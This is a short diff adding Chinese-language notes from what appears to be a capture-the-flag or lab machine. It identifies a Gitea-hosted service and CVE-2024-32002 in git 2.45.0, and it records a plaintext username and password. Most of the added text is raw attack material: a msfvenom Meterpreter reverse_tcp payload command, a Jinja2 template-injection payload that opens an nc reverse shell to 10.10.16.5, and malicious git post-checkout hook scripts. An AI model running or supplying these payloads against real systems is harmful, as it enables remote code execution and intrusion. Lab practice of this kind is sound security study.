@@ -92,3 +92,41 @@ Powered by Gitea
 
 
 Server: Werkzeug/3.0.3 Python/3.12.3
+
+
+
+
+Gitea上找到5000端口的源码
+![](Compiled_files/1.jpg)
+
+
+在Calculator项目里得知git的版本为：2.45.0.windows.1
+![](Compiled_files/2.jpg)
+
+
+CVE-2024-32002
+
+chen
+
+R2*#?n%V8e4#Hhk
+
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=443 -f csharp
+
+
+http://{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.10.16.5 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}.git
+
+
+http://{{ __import__('os').system('ping -c 1 10.10.16.5') }}.git
+
+
+echo 'cmd /c ping 10.10.16.5' > .githooks/post-checkout
+
+
+cat > y/hooks/post-checkout <<EOF
+#!/bin/bash
+echo "amal_was_here" > /tmp/pwnd
+cmd /c ping 10.10.16.5
+open -a Calculator.app
+EOF
